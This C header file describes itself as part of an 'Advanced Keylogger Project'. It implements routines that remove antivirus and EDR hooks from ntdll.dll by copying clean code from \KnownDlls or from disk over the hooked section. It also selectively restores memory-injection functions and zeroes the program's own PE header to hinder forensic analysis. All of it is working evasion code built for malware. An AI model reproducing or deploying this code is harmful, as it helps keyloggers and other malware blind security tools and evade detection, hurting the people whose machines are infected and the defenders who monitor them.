/*
 * Ntdll Unhooking Header
 * Removes EDR/AV hooks from ntdll.dll in memory
 * 
 * Techniques:
 * 1. KnownDlls unhooking - Read clean ntdll from \KnownDlls
 * 2. Disk unhooking - Read clean ntdll from System32
 * 3. Suspend/Remap - Map fresh copy of ntdll
 * 
 * The goal is to restore hooked functions to their original state
 * so our syscalls work correctly.
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef UNHOOK_H
#define UNHOOK_H

#include <windows.h>
#include <winternl.h>
#include "syscalls.h"

// ==================== STRUCTURES ====================

typedef struct _SECTION_INFO {
    PVOID pBase;
    SIZE_T dwSize;
    DWORD dwRVA;
} SECTION_INFO, *PSECTION_INFO;

// ==================== NATIVE API DEFINITIONS ====================

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS(NTAPI* pNtOpenSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition, // SECTION_INHERIT
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// ==================== KNOWNDLLS UNHOOKING ====================
/*
 * Windows caches certain DLLs in a shared section called \KnownDlls
 * This is accessible via NtOpenSection and contains clean copies.
 * 
 * Advantage: No disk access, faster
 * Disadvantage: Only works for known DLLs (ntdll, kernel32, etc.)
 */

inline PVOID GetCleanNtdllFromKnownDlls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    
    pNtOpenSection NtOpenSection = (pNtOpenSection)GetProcAddress(hNtdll, "NtOpenSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    
    if (!NtOpenSection || !NtMapViewOfSection) return NULL;
    
    // \KnownDlls\ntdll.dll
    WCHAR szSectionName[] = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING usSectionName;
    usSectionName.Buffer = szSectionName;
    usSectionName.Length = sizeof(szSectionName) - sizeof(WCHAR);
    usSectionName.MaximumLength = sizeof(szSectionName);
    
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &usSectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    HANDLE hSection = NULL;
    NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &objAttr);
    
    if (!NT_SUCCESS(status)) {
        return NULL;
    }
    
    PVOID pCleanNtdll = NULL;
    SIZE_T viewSize = 0;
    
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pCleanNtdll,
        0,
        0,
        NULL,
        &viewSize,
        1, // ViewShare
        0,
        PAGE_READONLY
    );
    
    CloseHandle(hSection);
    
    if (!NT_SUCCESS(status)) {
        return NULL;
    }
    
    return pCleanNtdll;
}

// ==================== DISK UNHOOKING ====================
/*
 * Read ntdll.dll directly from disk (C:\Windows\System32\ntdll.dll)
 * Parse PE and map sections manually
 * 
 * Advantage: Always works
 * Disadvantage: Disk I/O may be monitored
 */

inline PVOID GetCleanNtdllFromDisk() {
    char szPath[MAX_PATH];
    GetSystemDirectoryA(szPath, MAX_PATH);
    strcat_s(szPath, "\\ntdll.dll");
    
    // Open file
    HANDLE hFile = CreateFileA(
        szPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    
    // Get file size
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return NULL;
    }
    
    // Allocate buffer
    PVOID pBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuffer) {
        CloseHandle(hFile);
        return NULL;
    }
    
    // Read file
    DWORD dwBytesRead;
    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL)) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }
    
    CloseHandle(hFile);
    return pBuffer;
}

// ==================== TEXT SECTION FINDER ====================

inline BOOL GetTextSection(PVOID pModule, PSECTION_INFO pSectionInfo) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    PIMAGE_SECTION_HEADER pSections = IMAGE_FIRST_SECTION(pNtHeaders);
    
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        // Look for .text section
        if (memcmp(pSections[i].Name, ".text", 5) == 0 ||
            (pSections[i].Characteristics & IMAGE_SCN_CNT_CODE)) {
            pSectionInfo->dwRVA = pSections[i].VirtualAddress;
            pSectionInfo->dwSize = pSections[i].Misc.VirtualSize;
            pSectionInfo->pBase = (PVOID)((BYTE*)pModule + pSections[i].VirtualAddress);
            return TRUE;
        }
    }
    
    return FALSE;
}

// Get raw offset for section in file (disk-based)
inline DWORD GetSectionRawOffset(PVOID pFileBuffer, DWORD dwRVA) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pFileBuffer + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSections = IMAGE_FIRST_SECTION(pNtHeaders);
    
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (dwRVA >= pSections[i].VirtualAddress &&
            dwRVA < pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize) {
            return pSections[i].PointerToRawData + (dwRVA - pSections[i].VirtualAddress);
        }
    }
    
    return 0;
}

// ==================== MAIN UNHOOK FUNCTIONS ====================

// Unhook ntdll using KnownDlls (preferred method)
inline BOOL UnhookNtdllFromKnownDlls() {
    // Get hooked ntdll
    HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
    if (!hHookedNtdll) return FALSE;
    
    // Get clean ntdll from KnownDlls
    PVOID pCleanNtdll = GetCleanNtdllFromKnownDlls();
    if (!pCleanNtdll) return FALSE;
    
    // Get .text section info from hooked module
    SECTION_INFO hookedText = { 0 };
    if (!GetTextSection((PVOID)hHookedNtdll, &hookedText)) {
        // Unmap clean ntdll
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (NtUnmap) NtUnmap(GetCurrentProcess(), pCleanNtdll);
        return FALSE;
    }
    
    // Get .text section from clean module
    SECTION_INFO cleanText = { 0 };
    if (!GetTextSection(pCleanNtdll, &cleanText)) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (NtUnmap) NtUnmap(GetCurrentProcess(), pCleanNtdll);
        return FALSE;
    }
    
    // Change protection of hooked .text to RWX
    DWORD dwOldProtect;
    if (!VirtualProtect(hookedText.pBase, hookedText.dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (NtUnmap) NtUnmap(GetCurrentProcess(), pCleanNtdll);
        return FALSE;
    }
    
    // Copy clean .text over hooked .text
    SIZE_T sizeToCopy = min(hookedText.dwSize, cleanText.dwSize);
    memcpy(hookedText.pBase, cleanText.pBase, sizeToCopy);
    
    // Restore protection
    VirtualProtect(hookedText.pBase, hookedText.dwSize, dwOldProtect, &dwOldProtect);
    
    // Unmap clean ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (NtUnmap) NtUnmap(GetCurrentProcess(), pCleanNtdll);
    
    return TRUE;
}

// Unhook ntdll from disk (fallback method)
inline BOOL UnhookNtdllFromDisk() {
    // Get hooked ntdll
    HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
    if (!hHookedNtdll) return FALSE;
    
    // Read clean ntdll from disk
    PVOID pFileBuffer = GetCleanNtdllFromDisk();
    if (!pFileBuffer) return FALSE;
    
    // Get .text section info from hooked module
    SECTION_INFO hookedText = { 0 };
    if (!GetTextSection((PVOID)hHookedNtdll, &hookedText)) {
        VirtualFree(pFileBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Get raw offset of .text in file
    DWORD dwRawOffset = GetSectionRawOffset(pFileBuffer, hookedText.dwRVA);
    if (dwRawOffset == 0) {
        VirtualFree(pFileBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Change protection
    DWORD dwOldProtect;
    if (!VirtualProtect(hookedText.pBase, hookedText.dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        VirtualFree(pFileBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Copy clean .text over hooked .text
    memcpy(hookedText.pBase, (BYTE*)pFileBuffer + dwRawOffset, hookedText.dwSize);
    
    // Restore protection
    VirtualProtect(hookedText.pBase, hookedText.dwSize, dwOldProtect, &dwOldProtect);
    
    // Free buffer
    VirtualFree(pFileBuffer, 0, MEM_RELEASE);
    
    return TRUE;
}

// ==================== SELECTIVE UNHOOKING ====================
/*
 * Instead of unhooking the entire .text section (noisy),
 * only unhook specific functions we need.
 */

inline BOOL UnhookFunction(const char* szFunctionName) {
    HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
    if (!hHookedNtdll) return FALSE;
    
    PVOID pHookedFunc = GetProcAddress(hHookedNtdll, szFunctionName);
    if (!pHookedFunc) return FALSE;
    
    // Get clean ntdll
    PVOID pCleanNtdll = GetCleanNtdllFromKnownDlls();
    if (!pCleanNtdll) {
        // Fallback to disk
        pCleanNtdll = GetCleanNtdllFromDisk();
        if (!pCleanNtdll) return FALSE;
    }
    
    // Find function in clean ntdll
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + pDos->e_lfanew);
    DWORD dwExportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pCleanNtdll + dwExportRVA);
    
    PDWORD pNames = (PDWORD)((BYTE*)pCleanNtdll + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((BYTE*)pCleanNtdll + pExport->AddressOfFunctions);
    PWORD pOrds = (PWORD)((BYTE*)pCleanNtdll + pExport->AddressOfNameOrdinals);
    
    PVOID pCleanFunc = NULL;
    
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)pCleanNtdll + pNames[i]);
        if (strcmp(name, szFunctionName) == 0) {
            pCleanFunc = (PVOID)((BYTE*)pCleanNtdll + pFuncs[pOrds[i]]);
            break;
        }
    }
    
    if (!pCleanFunc) {
        // Cleanup based on source
        if (*(DWORD*)pCleanNtdll == 0x00905A4D) {
            VirtualFree(pCleanNtdll, 0, MEM_RELEASE);
        }
        return FALSE;
    }
    
    // Calculate offset within ntdll
    SIZE_T offset = (SIZE_T)pHookedFunc - (SIZE_T)hHookedNtdll;
    
    // NT functions are typically 32 bytes
    SIZE_T funcSize = 32;
    
    // Change protection
    DWORD dwOldProtect;
    if (!VirtualProtect(pHookedFunc, funcSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }
    
    // Copy clean function bytes
    memcpy(pHookedFunc, pCleanFunc, funcSize);
    
    // Restore protection
    VirtualProtect(pHookedFunc, funcSize, dwOldProtect, &dwOldProtect);
    
    return TRUE;
}

// Unhook multiple functions at once
inline BOOL UnhookFunctions(const char* szFunctions[], int count) {
    BOOL success = TRUE;
    
    for (int i = 0; i < count; i++) {
        if (!UnhookFunction(szFunctions[i])) {
            success = FALSE;
        }
    }
    
    return success;
}

// ==================== PE HEADER STOMPING ====================
/*
 * After unhooking, stomp our PE header to make forensics harder
 */

inline BOOL StompPEHeader() {
    HMODULE hSelf = GetModuleHandleA(NULL);
    if (!hSelf) return FALSE;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hSelf;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hSelf + pDos->e_lfanew);
    
    // Size of headers
    DWORD dwHeaderSize = pNt->OptionalHeader.SizeOfHeaders;
    
    // Change protection
    DWORD dwOldProtect;
    if (!VirtualProtect(hSelf, dwHeaderSize, PAGE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }
    
    // Zero out headers
    memset(hSelf, 0, dwHeaderSize);
    
    // Restore protection (optional, headers are now garbage)
    VirtualProtect(hSelf, dwHeaderSize, dwOldProtect, &dwOldProtect);
    
    return TRUE;
}

// ==================== MASTER UNHOOK FUNCTION ====================

inline BOOL PerformUnhooking() {
    // Try KnownDlls first (faster, no disk I/O)
    if (UnhookNtdllFromKnownDlls()) {
        return TRUE;
    }
    
    // Fallback to disk
    return UnhookNtdllFromDisk();
}

// Selective unhook only critical functions
inline BOOL PerformSelectiveUnhook() {
    const char* criticalFuncs[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtQueryInformationProcess",
        "NtSetInformationThread",
        "NtDelayExecution"
    };
    
    int count = sizeof(criticalFuncs) / sizeof(criticalFuncs[0]);
    return UnhookFunctions(criticalFuncs, count);
}

#endif // UNHOOK_H
